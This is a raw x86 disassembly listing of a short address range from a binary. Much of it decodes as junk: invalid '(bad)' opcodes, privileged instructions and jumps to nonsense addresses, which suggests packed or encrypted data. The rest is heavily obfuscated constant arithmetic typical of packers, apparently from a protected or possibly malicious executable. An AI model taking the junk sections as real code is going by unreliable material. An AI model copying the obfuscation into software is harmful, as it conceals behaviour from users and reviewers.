  40e56f:	or     DWORD PTR [eax+0x6567869c],ebx
  40e575:	mov    ebx,esi
  40e577:	arpl   ax,dx
  40e579:	(bad)  
  40e57b:	fnsave [esi]
  40e57d:	int3   
  40e57e:	jmp    0x40e5bd
  40e580:	or     edi,esi
  40e582:	pop    esi
  40e583:	xchg   esp,eax
  40e584:	lahf   
  40e585:	dec    ebx
  40e586:	mov    ds:0x87716552,al
  40e58b:	add    BYTE PTR [ebp+0x43],ch
  40e58e:	push   eax
  40e58f:	push   eax
  40e590:	lock and eax,0x44836a3b
  40e596:	es inc ebp
  40e598:	add    ecx,DWORD PTR [ebx-0x6ce84127]
  40e59e:	scas   al,BYTE PTR es:[edi]
  40e59f:	cdq    
  40e5a0:	adc    dl,BYTE PTR [eax+0x2368b1aa]
  40e5a6:	es das 
  40e5a8:	fidivr DWORD PTR [esi*1+0x75d79f7d]
  40e5af:	xchg   ebp,eax
  40e5b0:	pusha  
  40e5b1:	iret   
  40e5b2:	in     al,dx
  40e5b3:	pop    ds
  40e5b4:	adc    DWORD PTR [edi+0x1efed98f],edi
  40e5ba:	out    0x6c,al
  40e5bc:	jo     0x40e5a3
  40e5be:	or     ebx,DWORD PTR [ecx]
  40e5c0:	xchg   DWORD PTR [eax],ebp
  40e5c2:	push   ecx
  40e5c3:	lods   al,BYTE PTR ds:[esi]
  40e5c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c5:	push   ecx
  40e5c6:	jb     0x40e599
  40e5c8:	push   ss
  40e5c9:	sub    esi,0x63d8fb60
  40e5cf:	lods   al,BYTE PTR ds:[esi]
  40e5d0:	imul   ebx,DWORD PTR [esi],0x597b5b9c
  40e5d6:	(bad)  
  40e5d7:	repz mov esp,0x596d162
  40e5dd:	push   esp
  40e5de:	push   esi
  40e5df:	sub    DWORD PTR [ecx-0x5ae1c351],edx
  40e5e5:	into   
  40e5e6:	sub    eax,0x3bf1dde6
  40e5eb:	call   0x7bf5a4e1
  40e5f0:	in     al,0x19
  40e5f2:	jecxz  0x40e5e3
  40e5f4:	into   
  40e5f5:	jmp    0x3350fc27
  40e5fa:	(bad)  
  40e5fb:	jecxz  0x40e589
  40e5fd:	ret    
  40e5fe:	push   eax
  40e5ff:	(bad)
  40e603:	lods   al,BYTE PTR ds:[esi]
  40e604:	or     DWORD PTR [ebx-0x2e],ecx
  40e607:	ret    0xdead
  40e60a:	ss dec esp
  40e60c:	and    eax,0xe810a0ee
  40e611:	mov    ebp,0x75a7185b
  40e616:	nop
  40e617:	test   edx,ecx
  40e619:	push   ebx
  40e61a:	sbb    DWORD PTR [ebx],eax
  40e61c:	xor    bh,dl
  40e61e:	mov    DWORD PTR [ecx+esi*4],0x8c8a9022
  40e625:	cmp    al,0x69
  40e627:	adc    DWORD PTR [edi+0x1f9c0fd5],0x5e16f8d
  40e631:	cli    
  40e632:	jae    0x40e63e
  40e634:	jmp    0x40e679
  40e636:	pop    edx
  40e637:	xchg   edi,eax
  40e638:	dec    edx
  40e639:	pop    esi
  40e63a:	and    bh,dl
  40e63c:	(bad)  
  40e63d:	jle    0x40e61b
  40e63f:	cs mov esi,0xe73ca1df
  40e645:	(bad)  
  40e646:	and    al,0xcd
  40e648:	cmp    eax,0xc05a29f0
  40e64d:	(bad)  
  40e64e:	out    dx,eax
  40e64f:	xchg   edi,eax
  40e650:	stos   DWORD PTR es:[edi],eax
  40e651:	pusha  
  40e652:	das    
  40e653:	inc    eax
  40e654:	sub    ecx,ecx
  40e656:	out    dx,al
  40e657:	jp     0x40e6d4
  40e659:	shl    BYTE PTR [ebx],1
  40e65b:	jecxz  0x40e614
  40e65d:	lahf   
  40e65e:	cmp    al,ah
  40e660:	sub    cl,dh
  40e662:	jnp    0x40e6b8
  40e664:	jmp    0xfef3:0xed2a06c8
  40e66b:	and    al,0x8b
  40e66d:	lods   eax,DWORD PTR es:[si]
  40e670:	jecxz  0x40e66e
  40e672:	pop    ss
  40e673:	loope  0x40e5f6
  40e675:	popa   
  40e676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e677:	jle    0x40e6ea
  40e679:	sti    
  40e67a:	arpl   WORD PTR [ebx-0x5ed42137],si
  40e680:	out    0x8b,eax
  40e682:	int3   
  40e683:	or     al,0x40
  40e685:	jbe    0x40e67a
  40e687:	push   eax
  40e688:	xchg   DWORD PTR [eax-0x450699ba],esi
  40e68e:	sub    BYTE PTR [edi],cl
  40e690:	rcl    BYTE PTR [eax+eiz*1],cl
  40e693:	pushf  
  40e694:	or     DWORD PTR [ebp+0x2c],0x14
  40e698:	mov    al,0x2e
  40e69a:	bnd jno 0x40e690
  40e69d:	sub    BYTE PTR [ecx+eax*2],dh
  40e6a0:	sbb    bl,ah
  40e6a2:	inc    ebp
  40e6a3:	cmc    
  40e6a4:	push   ecx
  40e6a5:	jp     0x40e669
  40e6a7:	aas    
  40e6a8:	test   eax,0x591be5b2
  40e6ad:	neg    BYTE PTR [esi]
  40e6af:	jb     0x40e6fa
  40e6b1:	inc    ebp
  40e6b2:	dec    ebx
  40e6b3:	aaa    
  40e6b4:	into   
  40e6b5:	imul   ecx,eax,0xffffffd1
  40e6b8:	rcl    DWORD PTR [edi-0x60],1
  40e6bb:	lods   al,BYTE PTR ds:[esi]
  40e6bc:	inc    ebp
  40e6bd:	mov    esp,0xbabcca76
  40e6c2:	call   0xd0ffac07
  40e6c7:	inc    ebp
  40e6c8:	sub    al,0x1d
  40e6ca:	ja     0x40e718
  40e6cc:	xor    al,0x83
  40e6ce:	mov    cl,0x65
  40e6d0:	es push cs
  40e6d2:	fcmovbe st,st(3)
  40e6d4:	jl     0x40e68a
  40e6d6:	cld    
  40e6d7:	mov    edi,0xb739d342
  40e6dc:	dec    edx
  40e6dd:	ja     0x40e667
  40e6df:	test   al,0x46
  40e6e1:	loope  0x40e671
  40e6e3:	push   ebx
  40e6e4:	jge    0x40e677
  40e6e6:	mov    eax,ds:0xff90e210
  40e6eb:	mov    ebp,0x914a4df3
  40e6f0:	adc    DWORD PTR ss:[ebp-0x1ebd7039],ecx
  40e6f7:	adc    dh,BYTE PTR [eax+0x165d0ed7]
  40e6fd:	mov    esp,0x9c717ffc
  40e702:	wrmsr  
  40e704:	push   esp
  40e705:	pusha  
  40e706:	add    al,0xee
  40e708:	cmp    dl,BYTE PTR [ebp-0x50]
  40e70b:	mov    WORD PTR [esp+edi*4+0x45f43427],ss
  40e712:	inc    esp
  40e713:	pop    ebx
  40e714:	(bad)  
  40e715:	scas   eax,DWORD PTR es:[edi]
  40e716:	enter  0x9192,0x88
  40e71a:	into   
  40e71b:	sar    BYTE PTR [ecx-0x51acac70],0x3d
  40e722:	push   edi
  40e723:	mov    ebp,0x72eacf60
  40e728:	ja     0x40e743
  40e72a:	js     0x40e6e8
  40e72c:	mov    edi,0xacce18a5
  40e731:	dec    edx
  40e732:	out    dx,eax
  40e733:	outs   dx,DWORD PTR ds:[esi]
  40e734:	stc    
  40e735:	es inc edx
  40e737:	in     eax,0x4d
  40e739:	nop
  40e73a:	fnsave ds:0x98ba76a1
  40e740:	loopne 0x40e79e
  40e742:	or     ebp,esp
  40e744:	pushf  
  40e745:	mov    bh,0x83
  40e747:	or     edx,edi
  40e749:	pop    esi
  40e74a:	das    
  40e74b:	outs   dx,DWORD PTR ds:[esi]
  40e74c:	(bad)  
  40e74e:	pop    ss
  40e74f:	scas   al,BYTE PTR es:[edi]
  40e750:	std    
  40e751:	outs   dx,BYTE PTR ds:[esi]
  40e752:	das    
  40e753:	push   edx
  40e754:	push   0xffffffd4
  40e756:	xchg   esi,eax
  40e757:	sar    BYTE PTR [ebx-0x4ed2c29d],1
  40e75d:	addr16 dec esp
  40e75f:	push   ebx
  40e760:	jne    0x40e75a
  40e762:	and    eax,0x88ec7609
  40e767:	loopne 0x40e71f
  40e769:	mov    ecx,0x96c3a69a
  40e76e:	cli    
  40e76f:	mov    dh,0x22
  40e771:	mov    WORD PTR [edx],cs
  40e773:	(bad)
  40e777:	cli    
  40e778:	nop
  40e779:	popw   es
  40e77b:	popf   
  40e77c:	test   al,0xd0
  40e77e:	icebp  
  40e77f:	pusha  
  40e780:	jbe    0x40e74e
  40e782:	dec    esi
  40e783:	mov    ecx,0xa60a9961
  40e788:	sti    
  40e789:	sub    eax,0xd6d89620
  40e78e:	push   esi
  40e78f:	dec    esi
  40e790:	add    ah,cl
  40e792:	adc    al,0x8f
  40e794:	retf   
  40e795:	push   edx
  40e796:	pop    es
  40e797:	bound  ebp,QWORD PTR [esi-0x7e]
  40e79a:	ret    
  40e79b:	fisub  DWORD PTR [eax+0x4a922695]
  40e7a1:	loope  0x40e7ca
  40e7a3:	push   esi
  40e7a4:	mov    ch,0xa5
  40e7a6:	stos   DWORD PTR es:[edi],eax
  40e7a7:	pop    ds
  40e7a8:	(bad)  ds:0x5e36cd8
  40e7ae:	(bad)  
  40e7af:	test   DWORD PTR [edi+0x25],ebp
  40e7b2:	inc    esi
  40e7b3:	jmp    0xb1f732db
  40e7b8:	mov    bh,0xdf
  40e7ba:	scas   eax,DWORD PTR es:[edi]
  40e7bb:	mov    al,ds:0xda4157f4
  40e7c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7c1:	cmp    DWORD PTR [eax+0x43d2],0x2b
  40e7c8:	rol    DWORD PTR [ebx],0x45
  40e7cb:	or     al,0x33
  40e7cd:	rol    BYTE PTR [ebx],cl
  40e7cf:	inc    ebp
  40e7d0:	in     al,dx
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax+0x7ada6ccf]
  40e85d:	xchg   edx,eax
  40e85e:	stos   BYTE PTR es:[edi],al
  40e85f:	or     bh,BYTE PTR [esi-0x413bfe42]
  40e865:	mov    esi,0xdab906a0
  40e86a:	lock (bad) 
  40e86c:	out    dx,al
  40e86d:	pop    edx
  40e86e:	dec    esp
  40e86f:	ins    BYTE PTR es:[edi],dx
  40e870:	or     dh,BYTE PTR [edi-0x5697c3ca]
  40e876:	fiadd  WORD PTR [ecx+0x15]
  40e879:	xlat   BYTE PTR ds:[ebx]
  40e87a:	sbb    dl,BYTE PTR [ebx+0x63]
  40e87d:	jle    0x40e879
  40e87f:	cmp    ah,bh
  40e881:	dec    eax
  40e882:	or     eax,0x5b249f46
  40e887:	cwde   
  40e888:	int3   
  40e889:	mov    eax,ds:0x154336ef
  40e88e:	test   al,0xf
  40e890:	mov    eax,0x19a46acc
  40e895:	or     DWORD PTR [edi-0x6b],esp
  40e898:	xor    DWORD PTR [esi],ecx
  40e89a:	popa   
  40e89b:	repnz sub eax,0xe480950
  40e8a1:	aam    0x44
  40e8a3:	cmp    DWORD PTR [esi+0x47f018ad],0x24
  40e8aa:	pop    edx
  40e8ab:	push   ebp
  40e8ac:	xchg   BYTE PTR [ebp-0x52],ah
  40e8af:	pop    esi
  40e8b0:	push   eax
  40e8b1:	inc    ebx
  40e8b2:	push   0x73
  40e8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8b5:	adc    BYTE PTR [ebx+edx*1+0x49be6b6b],cl
  40e8bc:	enter  0x50d9,0x85
  40e8c0:	mov    ds:0xb7cde9e1,al
  40e8c5:	cmc    
  40e8c6:	in     eax,0xf5
  40e8c8:	lock sbb ch,BYTE PTR [eax+ecx*2-0x49]
  40e8cd:	adc    bh,0x3a
  40e8d0:	xchg   dh,ch
  40e8d2:	loop   0x40e905
  40e8d4:	adc    al,0x91
  40e8d6:	jl     0x40e87b
  40e8d8:	ficomp DWORD PTR [ebp+0x10ef209f]
  40e8de:	mov    ecx,0x3887f50c
  40e8e3:	dec    edi
  40e8e4:	mov    eax,0x84347acb
  40e8e9:	shl    BYTE PTR ds:0xf4365e57,cl
  40e8ef:	data16 outs dx,BYTE PTR ds:[esi]
  40e8f1:	jno    0x40e8be
  40e8f3:	mov    ebp,0x5caf111
  40e8f8:	pop    eax
  40e8f9:	jl     0x40e8de
  40e8fb:	xchg   ebx,eax
  40e8fc:	and    dl,BYTE PTR [edi+0x6f2d68bf]
  40e902:	div    ah
  40e904:	sbb    ch,ch
  40e906:	test   eax,0xd8a0b146
  40e90b:	jnp    0x40e8cd
  40e90d:	xor    bh,cl
  40e90f:	mov    edi,0xd4525a48
  40e914:	adc    DWORD PTR [edx],eax
  40e916:	das    
  40e917:	push   esp
  40e918:	shr    DWORD PTR [edx+0x73],1
  40e91b:	sbb    DWORD PTR [eax],ebp
  40e91d:	(bad)  
  40e91e:	jmp    0xb38258db
  40e923:	jo     0x40e8f1
  40e925:	sub    ecx,DWORD PTR [ecx]
  40e927:	stos   BYTE PTR es:[edi],al
  40e928:	imul   esi,DWORD PTR [edx+ebp*2-0x43],0xfffffffc
  40e92d:	sbb    BYTE PTR [esi+0x7e],dl
  40e930:	lods   al,BYTE PTR ds:[esi]
  40e931:	mov    ecx,0x64230af9
  40e936:	inc    edx
  40e937:	rcl    BYTE PTR ds:0xbfb27763,1
  40e93d:	(bad)  [esi]
  40e93f:	jecxz  0x40e954
  40e941:	iret   
  40e942:	cli    
  40e943:	xor    eax,0x32e45679
  40e948:	cmp    al,0x15
  40e94a:	jmp    0xdfd:0xfbcdc051
  40e951:	sbb    esi,eax
  40e953:	stos   BYTE PTR es:[edi],al
  40e954:	sbb    dh,dh
  40e956:	loop   0x40e956
  40e958:	lods   eax,DWORD PTR ds:[esi]
  40e959:	or     DWORD PTR [ecx+eiz*2],ebp
  40e95c:	imul   esi,DWORD PTR [esi+0x5b958319],0x1038c66a
  40e966:	inc    edi
  40e967:	add    eax,0xcb4ae44e
  40e96c:	mov    bh,0x5f
  40e96e:	push   0x4e8f4fc
  40e973:	or     al,0x1
  40e975:	aad    0x93
  40e977:	or     al,0xba
  40e979:	ins    BYTE PTR es:[edi],dx
  40e97a:	jp     0x40e962
  40e97c:	test   DWORD PTR [edx+0x6e12f12c],edi
  40e982:	adc    ebx,edx
  40e984:	and    BYTE PTR [edi+0x21b7dfca],0x5b
  40e98b:	aaa    
  40e98c:	in     al,0x78
  40e98e:	mov    ah,0x90
  40e990:	pushf  
  40e991:	(bad)  
  40e992:	clc    
  40e993:	mov    cl,0x90
  40e995:	stc    
  40e996:	adc    ecx,DWORD PTR [ecx]
  40e998:	push   esp
  40e999:	adc    bh,al
  40e99b:	sbb    dh,dl
  40e99d:	mov    ch,0x4e
  40e99f:	pusha  
  40e9a0:	push   es
  40e9a1:	adc    BYTE PTR [ecx+0x5d],0x38
  40e9a5:	sbb    edi,DWORD PTR [esi-0x1bfa0c8e]
  40e9ab:	mov    ds:0xf920f0aa,eax
  40e9b0:	ss adc eax,0x8e5872ac
  40e9b6:	cdq    
  40e9b7:	loopne 0x40e9a0
  40e9b9:	push   edi
  40e9ba:	mov    cl,BYTE PTR [edi]
  40e9bc:	cmp    al,0xd
  40e9be:	xchg   BYTE PTR [ebp+0x1fd539ee],ch
  40e9c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9c5:	sbb    al,0x5a
  40e9c7:	pop    esi
  40e9c8:	adc    DWORD PTR [esi-0x497be3d1],edx
  40e9ce:	sub    edi,ebx
  40e9d0:	mov    ch,bh
  40e9d2:	pop    ss
  40e9d3:	cs shr ebp,1
  40e9d6:	jmp    0x89abf4cd
  40e9db:	inc    esi
  40e9dc:	mov    ch,0xbf
  40e9de:	jg     0x40e98f
  40e9e0:	retf   
  40e9e1:	enter  0x1457,0xab
  40e9e5:	push   eax
  40e9e6:	xlat   BYTE PTR ds:[ebx]
  40e9e7:	add    esp,DWORD PTR [ecx-0x66f6efae]
  40e9ed:	bound  ebx,QWORD PTR [esi-0x6f]
  40e9f0:	xor    BYTE PTR [esi],bl
  40e9f2:	aad    0xc4
  40e9f4:	call   0x3ccb:0xe3afa3e3
  40e9fb:	retf   0x4adb
  40e9fe:	jo     0x40e995
  40ea00:	repz mov ch,BYTE PTR [edi+0x3c5da3e0]
  40ea07:	jle    0x40e9c6
  40ea09:	xor    al,0xaa
  40ea0b:	adc    cl,cl
  40ea0d:	xchg   DWORD PTR [esi-0xb6448f3],edi
  40ea13:	stos   DWORD PTR es:[edi],eax
  40ea14:	pop    ss
  40ea15:	sar    DWORD PTR [edi+0x6fe0485b],0x2e
  40ea1c:	enter  0xf7d5,0xf2
  40ea20:	dec    esi
  40ea21:	mov    BYTE PTR [ebp-0x6],dl
  40ea24:	jnp    0x40ea3f
  40ea26:	and    ah,BYTE PTR [ebx+0x208c1209]
  40ea2c:	jmp    DWORD PTR [ebx+0x5467fb41]
  40ea32:	inc    ecx
  40ea33:	pusha  
  40ea34:	ror    BYTE PTR [ebx],cl
  40ea36:	xchg   DWORD PTR [ebp-0x7b],eax
  40ea39:	adc    al,0xe7
  40ea3b:	test   DWORD PTR [esi+0x47372e3d],0xaf02ba34
  40ea45:	pop    ecx
  40ea46:	daa    
  40ea47:	mov    ch,0xe9
  40ea49:	add    ebx,edi
  40ea4b:	mov    ebx,0x64d1ef08
  40ea50:	xor    BYTE PTR [eax-0x68],0x8b
  40ea54:	or     edi,DWORD PTR [eax+0x594f27ae]
  40ea5a:	xlat   BYTE PTR ds:[ebx]
  40ea5b:	pop    ecx
  40ea5c:	xchg   DWORD PTR [edx-0x378ba67c],ebp
  40ea62:	gs leave 
  40ea64:	les    ecx,FWORD PTR [ecx+eiz*1+0x71c1cc04]
  40ea6b:	ror    bh,cl
  40ea6d:	mov    esp,0x7b14a96f
  40ea72:	and    BYTE PTR [eax-0x231bb155],dl
  40ea78:	add    ah,ch
  40ea7a:	scas   al,BYTE PTR es:[edi]
  40ea7b:	mov    ecx,0xf0c72699
  40ea80:	inc    edi
  40ea81:	aas    
  40ea82:	mov    DWORD PTR [edi+ecx*4],0xdde2a1b4
  40ea89:	leave  
  40ea8a:	and    edx,ecx
  40ea8c:	push   ebp
  40ea8d:	test   dl,ah
  40ea8f:	fsubr  st(4),st
  40ea91:	hlt    
  40ea92:	gs cli 
  40ea94:	and    edx,edi
  40ea96:	mov    dl,0x6a
  40ea98:	fcom   QWORD PTR ds:0xef9055fa
  40ea9e:	fst    QWORD PTR [ecx]
  40eaa0:	dec    ecx
  40eaa1:	and    DWORD PTR [esp+esi*2],esp
  40eaa4:	pusha  
  40eaa5:	adc    eax,0x1f793e20
  40eaab:	repnz (bad) 
  40eaad:	ins    DWORD PTR es:[edi],dx
  40eaae:	popf   
  40eaaf:	ret    
  40eab0:	shl    bl,cl
  40eab2:	push   edi
  40eab3:	inc    DWORD PTR ds:0xcc74a75c
  40eab9:	inc    ebx
  40eaba:	adc    eax,0xd777f325
  40eabf:	ja     0x40ea6f
  40eac1:	mov    edx,0x64488a10
  40eac6:	repz neg DWORD PTR [ecx]
  40eac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaca:	rcl    BYTE PTR [ebp+0x7f5de087],cl
  40ead0:	mov    eax,0xaf4e11bd
  40ead5:	jmp    0x40eb2e
  40ead7:	and    esp,DWORD PTR [eax-0x5e]
  40eada:	int3   
  40eadb:	mov    al,BYTE PTR ds:0xf9c0578e
  40eae1:	push   edi
  40eae2:	add    bh,dl
  40eae4:	xchg   ebp,eax
  40eae5:	add    edi,eax
  40eae7:	xchg   ebp,eax
  40eae8:	je     0x40ea77
  40eaea:	jbe    0x40ea9d
  40eaec:	out    dx,al
  40eaed:	jns    0x40ea8f
  40eaef:	loop   0x40ea7e
  40eaf1:	xor    DWORD PTR [edx-0x2242daa8],ebp
  40eaf7:	in     al,0x6b
  40eaf9:	sub    ebx,DWORD PTR [ebp-0x23]
  40eafc:	outs   dx,BYTE PTR ds:[esi]
  40eafd:	pushf  
  40eafe:	xor    DWORD PTR [esi-0x2678d3f1],0xffffffca
  40eb05:	shr    DWORD PTR [ebx+eax*1-0x683ab298],cl
  40eb0c:	pop    ecx
  40eb0d:	push   esp
  40eb0e:	rcr    BYTE PTR [eax],1
  40eb10:	(bad)  
  40eb11:	(bad)  
  40eb12:	gs call 0x7b48557c
  40eb18:	icebp  
  40eb19:	add    dl,BYTE PTR [edx+0x741939c9]
  40eb1f:	dec    ebp
  40eb20:	mov    dl,0xb7
  40eb22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb23:	loope  0x40eb1c
  40eb25:	pop    ds
  40eb26:	lea    ecx,[esi]
  40eb28:	inc    ebx
  40eb29:	fwait
  40eb2a:	xor    ecx,DWORD PTR [edx+0x1159ef69]
  40eb30:	sub    DWORD PTR [ebx-0x73],eax
  40eb33:	sbb    edi,edi
  40eb35:	scas   eax,DWORD PTR es:[edi]
  40eb36:	outs   dx,DWORD PTR ds:[esi]
  40eb37:	mov    ds:0x70439d3d,al
  40eb3c:	inc    ecx
  40eb3d:	sbb    esi,edi
  40eb3f:	jne    0x40eacc
  40eb41:	add    BYTE PTR [edx+0x57],bl
  40eb44:	cmp    eax,0xa060bf8
  40eb49:	fs icebp 
  40eb4b:	arpl   WORD PTR [edx+0x39],si
  40eb4e:	inc    eax
  40eb4f:	ss jbe 0x40eafe
  40eb52:	and    eax,0x3285c628
  40eb57:	jmp    0x265bc56b
  40eb5c:	jge    0x40eb5d
  40eb5e:	adc    DWORD PTR [esi+0xdbe295f],ebp
  40eb64:	mov    al,ds:0x13812be
  40eb69:	(bad)  
  40eb6b:	cld    
  40eb6c:	mov    ds:0xae3f5086,al
  40eb71:	jnp    0x40eb1f
  40eb73:	test   eax,0x187ea805
  40eb78:	mov    ah,BYTE PTR [edx-0x63bf0275]
  40eb7e:	push   esi
  40eb7f:	clc    
  40eb80:	inc    ebp
  40eb81:	cmp    DWORD PTR [edx-0x2aa71e0],edi
  40eb87:	jo     0x40eb4e
  40eb89:	xor    edi,DWORD PTR [eax-0x18]
  40eb8c:	mov    DWORD PTR [ebp-0x60],0x4197
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x4226b8
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x4226b8
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
  40ed43:	xor    edx,0x2021
  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x422754
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x42274c,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x42274c
